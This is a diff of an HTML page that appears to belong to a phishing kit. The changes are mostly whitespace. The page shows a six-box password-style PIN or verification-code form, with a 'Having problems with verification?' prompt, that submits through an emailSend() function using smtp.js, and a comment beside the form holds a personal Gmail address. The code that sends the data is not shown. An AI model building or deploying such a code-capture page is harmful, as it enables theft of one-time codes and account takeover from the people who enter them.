@@ -31,17 +31,19 @@
                 </p>
         <form id="form" onsubmit="emailSend(); reset(); return false;" class="container" > <!--payday10177@gmail.com-->
     
-                    <div class="code-inputs input">
+           <div class="code-inputs input">
+
     <input
         type="password" 
         pattern="[0-9]*" 
-        inputmode="numeric"  <!-- Ensures the numeric keyboard on mobile devices -->
+        inputmode="numeric"
         id="pin1"
         class="code-input"
         maxlength="1"
         name="pin1"
     />
-    <input
+    
+        <input
         type="password" 
         pattern="[0-9]*" 
         inputmode="numeric"
@@ -50,6 +52,7 @@
         maxlength="1"
         name="pin2"
     />
+    
     <input
         type="password" 
         pattern="[0-9]*" 
@@ -87,11 +90,12 @@
         name="pin6"
     />
 </div>
-               <button type="submit" class="confirm-btn">Confirm</button><span class="hav">Having problems with verification?</span>
+                    <button type="submit" class="confirm-btn">Confirm</button><span class="hav">Having problems with verification?</span>
                 </form>
             </div>
         </div>
     </div>
+
 <script>
     // Add event listener to automatically move to the next input field
     document.querySelectorAll('.code-input').forEach((input, index, inputs) => {
@@ -115,10 +119,9 @@
         });
     });
 </script>
-    
     <script src="https://smtpjs.com/v3/smtp.js">
     <script src="app.js"></script>
     <script src="Contact-form-to-email1.js"></script>
 <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </body>
-</html>
+        </html>
